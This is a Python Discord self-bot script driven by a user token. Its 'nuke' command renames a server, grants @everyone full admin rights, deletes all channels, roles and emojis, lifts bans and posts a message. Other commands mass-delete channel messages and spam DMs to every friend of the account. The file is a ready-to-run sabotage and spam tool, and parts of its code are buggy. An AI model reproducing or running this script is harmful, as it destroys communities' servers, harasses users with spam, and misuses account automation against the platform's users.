import os
from os import system
import time
try:
  import colorama
  from colorama import Fore
except:
  os.system("pip install colorama")
  import colorama
  from colorama import Fore
try:
  import asyncio
  from asyncio import sleep
except:
  os.system("pip install asyncio")
  import asyncio
  from asyncio import sleep
try:
    import discord
    from discord.ext import commands
    from discord.utils import get
except:
    os.system("pip install discord.py")
    import discord
    from discord.ext import commands
    from discord.utils import get
    from discord import Permissions
clear = lambda: os.system('cls')
clear()
token = input(f"self bot token : ")
prefix = input(f"\nself bot prefix : ")
bot = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)
clear = lambda: os.system('cls')
clear()
@bot.event
async def on_ready():
    print(f"""
All commands : | {prefix}MassDM | {prefix}test | {prefix}nuke | {prefix}clear (nomber) | {prefix}clear_all |
""")

@bot.command()
async def test(ctx):
    await ctx.message.delete()
    print(f"self bot works !")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    name_user  = input(f"\nPut the nickname and hashtag of your discord account : ")
    channel = input(f"\nPut the name of the Channel that will be create : ")
    message = input(f"\nPut the name of the message that will be send : ")
    nuked_server_name =  input(f"\nnuked server name : ")
    guild = ctx.guild
    await ctx.guild.edit(name=f"{nuked_server_name}")
    print (f"the server name has been changed to {name_user}")
    with open('giphy.gif', 'rb') as f:
      icon = f.read()
      await ctx.guild.edit(icon=icon)
      print("the server icon has been changed to Atomic Bomb")
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print("now everyone is an admin")
    except:
      print("I didn't manage to put all the admin")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{channel.name} has been removed.")
      except:
        print(f"{channel.name} has not been deleted.")
    for role in guild.roles:
     try:
       await role.delete()
       print(f"{role.name} has been deleted")
     except:
       print(f"{role.name} has not been deleted")
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(f"{emoji.name} has been deleted")
     except:
       print(f"{emoji.name} has not been deleted")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban(f"{name_user}")
        print(f"{user.name}#{user.discriminator} has been debunked.")
      except:
        print(f"{user.name}#{user.discriminator} has not been debaned.")
    await guild.create_text_channel(channel)
    await channel.send(message)


@bot.command()
async def clear_all(ctx):
  await ctx.message.delete()
  messages = await ctx.channel.history().flatten()
  for message in messages:
    try:
      await message.delete()
    except:
      pass
  print("\nEND")

@bot.command()
async def clear(ctx, nombre : int):
  await ctx.message.delete()
  messages = await ctx.channel.history(limit=nombre).flatten()
  for message in messages:
    try:
      await message.delete()
      time.sleep(1.5)
    except:
      pass
  print("\nEND")

@bot.command()
async def MassDM(ctx):
  await ctx.message.delete()
  message = input(f"Mass spam message : ")
  for user in bot.user.friends:
    if user.id == bot.user.id:
      pass
    else:
      try:
        await user.send(message)
        print(f"message send to {user}")
      except:
        print(f"Couldn't interact with {user}")

bot.run(token)